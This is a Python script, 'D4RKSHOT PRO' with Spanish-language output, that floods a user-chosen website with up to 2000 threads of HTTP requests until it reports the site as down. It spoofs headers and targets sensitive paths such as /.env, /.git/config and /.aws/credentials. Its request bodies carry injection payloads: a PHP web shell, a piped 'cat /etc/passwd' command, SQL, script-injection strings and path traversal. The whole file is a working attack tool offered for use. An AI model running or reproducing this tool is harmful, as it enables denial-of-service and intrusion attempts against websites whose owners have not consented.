#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
D4RKSHOT PRO - Versión 3.2 (Modo Asalto Total + Diagnóstico Avanzado)
Autor: D4rkbyte
"""

import threading
import random
import requests
import time
import os
import sys
import warnings
from urllib.parse import urlparse

# Desactivar advertencias
warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings()

# Colores ANSI
R = "\033[91m"  # Rojo
G = "\033[92m"  # Verde
Y = "\033[93m"  # Amarillo
C = "\033[96m"  # Cyan
B = "\033[94m"  # Azul
W = "\033[0m"   # Reset

# -------------------------
# CONFIGURACIÓN
# -------------------------

MAX_THREADS = 2000
TIMEOUT = 5
DELAY = 0.01

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X)",
    "Mozilla/5.0 (Linux; Android 14)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS)"
]

TARGET_PATHS = [
    "/", "/wp-login.php", "/admin", "/.env", "/phpinfo.php", "/.git/config",
    "/api/v1/users", "/graphql", "/phpmyadmin", "/.aws/credentials"
]

HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH"]

def generate_malicious_payload():
    payloads = [
        {"cmd": "whoami"},
        {"query": "SELECT * FROM users"},
        {"q": "<script>alert(1)</script>"},
        {"data": "<?php system($_GET['cmd']); ?>"},
        {"exec": "|cat /etc/passwd"}
    ]
    return random.choice(payloads)

def attack_target(target, stats):
    session = requests.Session()
    session.verify = False
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "Accept": "*/*",
        "Connection": "keep-alive"
    }
    while True:
        try:
            method = random.choice(HTTP_METHODS)
            path = random.choice(TARGET_PATHS)
            if random.random() < 0.3:
                path += "?q=../../etc/passwd"
            url = target.rstrip('/') + path
            data = generate_malicious_payload() if method in ["POST", "PUT", "PATCH"] else None
            start = time.time()
            session.request(
                method=method,
                url=url,
                headers=headers,
                data=data,
                timeout=TIMEOUT,
                allow_redirects=False,
                stream=False
            )
            stats['success'] += 1
        except:
            stats['failures'] += 1
        finally:
            stats['total'] += 1
            time.sleep(DELAY)

def monitor_target(target, stats):
    session = requests.Session()
    session.verify = False
    last_status = "UP"
    first_down_logged = False

    while True:
        try:
            start = time.time()
            response = session.get(target, allow_redirects=False, timeout=10)
            delay = round((time.time() - start) * 1000)
            stats["last_response_time_ms"] = delay
            current_status = "DOWN" if response.status_code >= 500 else "UP"
        except requests.exceptions.RequestException:
            current_status = "DOWN"
            stats["last_response_time_ms"] = None

        if current_status != last_status:
            last_status = current_status

            if current_status == "DOWN" and not first_down_logged:
                elapsed = int(time.time() - stats['start_time'])
                req_sec = int(stats['total'] / elapsed) if elapsed > 0 else 0
                delay_str = f"{stats['last_response_time_ms']}ms" if stats['last_response_time_ms'] else "N/A"

                print(f"\n\n{R}🛑 OBJETIVO DETECTADO COMO CAÍDO{W}")
                print(f"{Y}══════════════════════════════════{W}")
                print(f"{C}⏳ Tiempo de ataque:   {elapsed} segundos{W}")
                print(f"{C}💣 Total de tiros:     {stats['total']}{W}")
                print(f"{C}🚀 Tiros/segundo:      {req_sec}{W}")
                print(f"{G}✅ Peticiones OK:      {stats['success']}{W}")
                print(f"{R}❌ Peticiones fallidas:{stats['failures']}{W}")
                print(f"{C}📡 Último RTT exitoso: {delay_str}{W}")
                print(f"{R}⚠️  El sitio ha dejado de responder completamente.{W}\n")

                first_down_logged = True

            elif current_status == "UP":
                print(f"\n{G}[✅] Objetivo RECUPERADO{W}")
                first_down_logged = False

        time.sleep(30)

def main():
    os.system("clear" if os.name == "posix" else "cls")
    print(rf"""{C}
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─████████████───██████████████─████████████████───██████──████████─██████████████─██████──██████─██████████████─██████████████─
─██░░░░░░░░████─██░░░░░░░░░░██─██░░░░░░░░░░░░██───██░░██──██░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─
─██░░████░░░░██─██░░██████░░██─██░░████████░░██───██░░██──██░░████─██░░██████████─██░░██──██░░██─██░░██████░░██─██████░░██████─
─██░░██──██░░██─██░░██──██░░██─██░░██────██░░██───██░░██──██░░██───██░░██─────────██░░██──██░░██─██░░██──██░░██─────██░░██─────
─██░░██──██░░██─██░░██████░░██─██░░████████░░██───██░░██████░░██───██░░██████████─██░░██████░░██─██░░██──██░░██─────██░░██─────
─██░░██──██░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───██░░░░░░░░░░██───██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██─────██░░██─────
─██░░██──██░░██─██░░██████░░██─██░░██████░░████───██░░██████░░██───██████████░░██─██░░██████░░██─██░░██──██░░██─────██░░██─────
─██░░██──██░░██─██░░██──██░░██─██░░██──██░░██─────██░░██──██░░██───────────██░░██─██░░██──██░░██─██░░██──██░░██─────██░░██─────
─██░░████░░░░██─██░░██──██░░██─██░░██──██░░██████─██░░██──██░░████─██████████░░██─██░░██──██░░██─██░░██████░░██─────██░░██─────
─██░░░░░░░░████─██░░██──██░░██─██░░██──██░░░░░░██─██░░██──██░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░░░░░░░░░██─────██░░██─────
─████████████───██████──██████─██████──██████████─██████──████████─██████████████─██████──██████─██████████████─────██████─────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  ░░░░░░███████ ]▄▄▄▄▄▄▄▄
▂▄▅█████████▅▄▃▂
I███████████████████].
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤... V.3
{W}
""")

    while True:
        target = input(f"{C}🎯 URL objetivo (http/https): {W}").strip()
        if urlparse(target).scheme in ("http", "https"):
            break
        print(f"{R}❌ URL inválida{W}")

    while True:
        try:
            threads = int(input(f"{C}💣 Hilos (1-{MAX_THREADS}): {W}"))
            if 1 <= threads <= MAX_THREADS:
                break
            print(f"{R}❌ Rango inválido{W}")
        except ValueError:
            print(f"{R}❌ Ingrese número válido{W}")

    stats = {
        'success': 0,
        'failures': 0,
        'total': 0,
        'start_time': time.time(),
        'last_response_time_ms': None
    }

    print(f"\n{G}[+] Iniciando ataque con {threads} hilos...{W}")
    print(f"{Y}[Estado] Inicializando...{W}\n")

    for _ in range(threads):
        t = threading.Thread(target=attack_target, args=(target, stats))
        t.daemon = True
        t.start()

    m = threading.Thread(target=monitor_target, args=(target, stats))
    m.daemon = True
    m.start()

    try:
        while True:
            elapsed = int(time.time() - stats['start_time'])
            req_sec = int(stats['total'] / elapsed) if elapsed > 0 else 0
            delay_str = f"{stats['last_response_time_ms']}ms" if stats['last_response_time_ms'] else "N/A"
            print(
                f"\r{Y}[Estado] ATAQUE ACTIVO | ⏱ {elapsed}s | 🔥 Tiros: {stats['total']} | 🚀 {req_sec}/s | {G}✅ {stats['success']} | {R}❌ {stats['failures']} | {C}📡 RTT: {delay_str} {W}",
                end=""
            )
            time.sleep(1)
    except KeyboardInterrupt:
        elapsed = int(time.time() - stats['start_time'])
        req_sec = int(stats['total'] / elapsed) if elapsed > 0 else 0
        delay_str = f"{stats['last_response_time_ms']}ms" if stats['last_response_time_ms'] else "N/A"
        print(f"\n\n{Y}📊 RESUMEN DEL ATAQUE FINALIZADO{W}")
        print(f"{Y}═════════════════════════════════{W}")
        print(f"{C}⏳ Duración total:     {elapsed} segundos{W}")
        print(f"{C}💣 Total de tiros:     {stats['total']}{W}")
        print(f"{C}🚀 Tiros/segundo:      {req_sec}{W}")
        print(f"{G}✅ Peticiones OK:      {stats['success']}{W}")
        print(f"{R}❌ Peticiones fallidas:{stats['failures']}{W}")
        print(f"{C}📡 Último tiempo de respuesta: {delay_str}{W}")
        sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"{R}\n[!] Error crítico: {str(e)}{W}")
        sys.exit(1)
